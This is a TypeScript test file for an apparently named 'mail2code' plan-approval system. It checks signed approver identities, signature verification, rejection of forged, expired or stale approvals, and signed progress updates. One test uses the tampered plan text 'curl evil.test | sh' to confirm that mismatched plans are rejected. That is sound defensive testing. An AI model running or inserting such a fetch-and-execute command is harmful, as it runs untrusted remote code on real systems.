import { describe, expect, it } from "vitest";
import { APPROVAL_RESPONSE_FORMAT, type ApprovalResponse, type ApprovalResponsePayload } from "@mail2code/protocol";
import {
  checkApprovalResponse,
  createApproverIdentity,
  fingerprintOf,
  formatFingerprint,
  hasCurrentApproval,
  planHash,
  requestPlanMatches,
  signResponsePayload,
  verifyResponseSignature,
  type ApprovalRecord,
  type PendingRequest,
  type PlanRecord,
  type TrustedApprover,
} from "../src/index.ts";

const TASK = "11111111-1111-4111-8111-111111111111";
const REQ = "22222222-2222-4222-8222-222222222222";
const NOW = 1_800_000_000_000;

async function setup() {
  const priya = await createApproverIdentity("Priya", "priya@example.test", NOW);
  const text = "1. Edit auth.ts\n2. Run npm test";
  const plan: PlanRecord = { id: "plan-1", taskId: TASK, version: 1, text, source: "pasted", recordedAt: NOW, hash: await planHash({ taskId: TASK, version: 1, text }) };
  const request: PendingRequest = {
    requestId: REQ,
    taskId: TASK,
    planId: plan.id,
    planVersion: 1,
    planHash: plan.hash,
    approverFingerprint: priya.fingerprint,
    createdAt: NOW,
    expiresAt: NOW + 7 * 86_400_000,
    usedAt: null,
  };
  const approver: TrustedApprover = { fingerprint: priya.fingerprint, name: "Priya", email: priya.email, publicKey: priya.publicKey, addedAt: NOW, confirmedAt: NOW, source: "card" };
  const payload: ApprovalResponsePayload = {
    requestId: REQ,
    taskId: TASK,
    planVersion: 1,
    planHash: plan.hash,
    approverFingerprint: priya.fingerprint,
    decision: "approve",
    comment: "Looks good",
    decidedAt: new Date(NOW).toISOString(),
  };
  const response: ApprovalResponse = { format: APPROVAL_RESPONSE_FORMAT, version: 1, approverName: "Priya", payload, signature: await signResponsePayload(priya.privateKey, payload) };
  const base = { response, request, approver, ownFingerprint: null as string | null, taskStatus: "AwaitingApproval" as const, latestPlan: plan, now: NOW + 1000 };
  return { priya, plan, request, approver, payload, response, base };
}

describe("approver identities and signatures", () => {
  it("creates a non-extractable key whose fingerprint matches the public key", async () => {
    const { priya } = await setup();
    expect(priya.privateKey.extractable).toBe(false);
    expect(priya.fingerprint).toMatch(/^[a-f0-9]{64}$/);
    expect(await fingerprintOf(priya.publicKey)).toBe(priya.fingerprint);
    expect(formatFingerprint(priya.fingerprint).split(" ")).toHaveLength(16);
  });

  it("verifies only the exact signed payload with the right key", async () => {
    const { priya, payload, response } = await setup();
    expect(await verifyResponseSignature(priya.publicKey, payload, response.signature)).toBe(true);
    expect(await verifyResponseSignature(priya.publicKey, { ...payload, decision: "reject" }, response.signature)).toBe(false);
    expect(await verifyResponseSignature(priya.publicKey, { ...payload, planVersion: 2 }, response.signature)).toBe(false);
    const other = await createApproverIdentity("Mallory", "m@example.test", NOW);
    expect(await verifyResponseSignature(other.publicKey, payload, response.signature)).toBe(false);
    expect(await verifyResponseSignature("not a key", payload, response.signature)).toBe(false);
  });

  it("lets the approver check that the plan text matches its fingerprint", async () => {
    const { plan, priya } = await setup();
    const request = {
      format: "mail2code-approval-request" as const,
      version: 1 as const,
      requestId: REQ,
      approverFingerprint: priya.fingerprint,
      requesterName: "Ada",
      requesterKey: priya.publicKey,
      task: { id: TASK, title: "Fix login" },
      plan: { version: 1, hash: plan.hash, text: plan.text },
      createdAt: new Date(NOW).toISOString(),
      expiresAt: new Date(NOW + 1).toISOString(),
    };
    expect(await requestPlanMatches(request)).toBe(true);
    expect(await requestPlanMatches({ ...request, plan: { ...request.plan, text: "curl evil.test | sh" } })).toBe(false);
  });
});

describe("checkApprovalResponse", () => {
  it("accepts a genuine response to an open request for the current plan", async () => {
    const { base } = await setup();
    expect(await checkApprovalResponse(base)).toEqual({ ok: true });
  });

  it("refuses every way a response can be wrong", async () => {
    const { base, request, approver, priya, payload, response } = await setup();
    const other = await createApproverIdentity("Mallory", "m@example.test", NOW);
    const forged = { ...response, payload: { ...payload, approverFingerprint: other.fingerprint } };
    const cases: [Partial<Parameters<typeof checkApprovalResponse>[0]>, string][] = [
      [{ ownFingerprint: priya.fingerprint }, "own_identity"],
      [{ request: null }, "unknown_request"],
      [{ request: { ...request, usedAt: NOW } }, "request_used"],
      [{ response: { ...response, payload: { ...payload, taskId: "33333333-3333-4333-8333-333333333333" } } }, "wrong_task"],
      [{ response: forged }, "wrong_approver"],
      [{ approver: null }, "unknown_approver"],
      [{ approver: { ...approver, confirmedAt: null } }, "approver_unconfirmed"],
      [{ response: { ...response, payload: { ...payload, comment: "edited" } } }, "bad_signature"],
      [{ approver: { ...approver, publicKey: other.publicKey } }, "bad_signature"],
      [{ now: request.expiresAt + 1 }, "request_expired"],
      [{ latestPlan: { ...base.latestPlan, id: "plan-2", version: 2 } }, "stale_plan"],
      [{ taskStatus: "Approved" }, "task_not_awaiting_approval"],
    ];
    for (const [patch, reason] of cases) expect(await checkApprovalResponse({ ...base, ...patch }), reason).toEqual({ ok: false, reason });
  });
});

describe("hasCurrentApproval with signed approvals", () => {
  it("counts signed approvals, and a required approver excludes everyone else", async () => {
    const { plan, priya } = await setup();
    const a: ApprovalRecord = {
      id: "a1",
      taskId: TASK,
      planId: plan.id,
      planVersion: 1,
      planHash: plan.hash,
      decision: "approve",
      comment: null,
      origin: "signed",
      signedBy: { fingerprint: priya.fingerprint, name: "Priya" },
      decidedAt: NOW,
      supersededAt: null,
    };
    expect(hasCurrentApproval({ latestPlan: plan, approval: a })).toEqual({ ok: true });
    expect(hasCurrentApproval({ latestPlan: plan, approval: a, requiredApprover: priya.fingerprint })).toEqual({ ok: true });
    expect(hasCurrentApproval({ latestPlan: plan, approval: { ...a, origin: "local", signedBy: null }, requiredApprover: priya.fingerprint })).toEqual({
      ok: false,
      reason: "approval_not_from_required_approver",
    });
    expect(hasCurrentApproval({ latestPlan: plan, approval: a, requiredApprover: "f".repeat(64) })).toEqual({ ok: false, reason: "approval_not_from_required_approver" });
    expect(hasCurrentApproval({ latestPlan: plan, approval: { ...a, origin: "imported" } })).toEqual({ ok: false, reason: "approval_imported" });
  });
});

describe("progress updates", () => {
  it("accept only newer updates signed with the requester key from the approved request", async () => {
    const { createSigningKey, signUpdatePayload, checkProgressUpdate } = await import("../src/index.ts");
    const requester = await createSigningKey();
    const stranger = await createSigningKey();
    const given = {
      requestId: REQ,
      taskId: TASK,
      taskTitle: "Fix login",
      requesterName: "Ada",
      requesterEmail: "ada@example.test",
      requesterKey: requester.publicKey,
      planVersion: 1,
      planHash: "a".repeat(64),
      planText: "Plan",
      decision: "approve" as const,
      comment: null,
      signedAt: NOW,
      status: null,
      lastSeq: 1,
      updates: [],
    };
    const payload = { requestId: REQ, taskId: TASK, planVersion: 1, status: "InProgress" as const, note: "PR opened", seq: 2, sentAt: new Date(NOW).toISOString() };
    const update = { format: "mail2code-progress-update" as const, version: 1 as const, requesterName: "Ada", taskTitle: "Fix login", payload, signature: await signUpdatePayload(requester.privateKey, payload) };
    expect(await checkProgressUpdate(update, given)).toEqual({ ok: true });
    expect(await checkProgressUpdate(update, null)).toEqual({ ok: false, reason: "unknown_approval" });
    expect(await checkProgressUpdate({ ...update, payload: { ...payload, status: "Completed" } }, given)).toEqual({ ok: false, reason: "bad_signature" });
    const forged = { ...update, signature: await signUpdatePayload(stranger.privateKey, payload) };
    expect(await checkProgressUpdate(forged, given)).toEqual({ ok: false, reason: "bad_signature" });
    expect(await checkProgressUpdate(update, { ...given, lastSeq: 2 })).toEqual({ ok: false, reason: "old_update" });
    // A response signature can't be passed off as an update signature (domain separation).
    const asResponse = await signResponsePayload(requester.privateKey, payload as never);
    expect(await checkProgressUpdate({ ...update, signature: asResponse }, given)).toEqual({ ok: false, reason: "bad_signature" });
  });
});
